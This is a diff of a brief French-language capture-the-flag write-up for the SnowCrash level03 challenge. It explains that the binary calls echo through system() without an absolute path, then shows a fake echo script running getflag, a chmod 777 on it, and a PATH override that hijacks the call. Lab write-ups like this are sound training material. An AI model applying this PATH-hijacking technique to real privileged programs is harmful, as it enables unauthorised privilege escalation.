@@ -2,4 +2,9 @@ level03@SnowCrash:~$ cat /var/tmp/echo
 #!/bin/sh
 getflag
 
-level03@SnowCrash:~$ PATH=/var/tmp:$PATH ./level03
+dans le level03 il y a un system(echo ... ) sans path absolu
+du coup on cree notre propre script echo et on change le path pour que notre script soit trouve en premier
+
+chmod 777 /var/tmp/echo
+
+level03@SnowCrash:~$ PATH=/var/tmp:$PATH /home/user/level03/level03
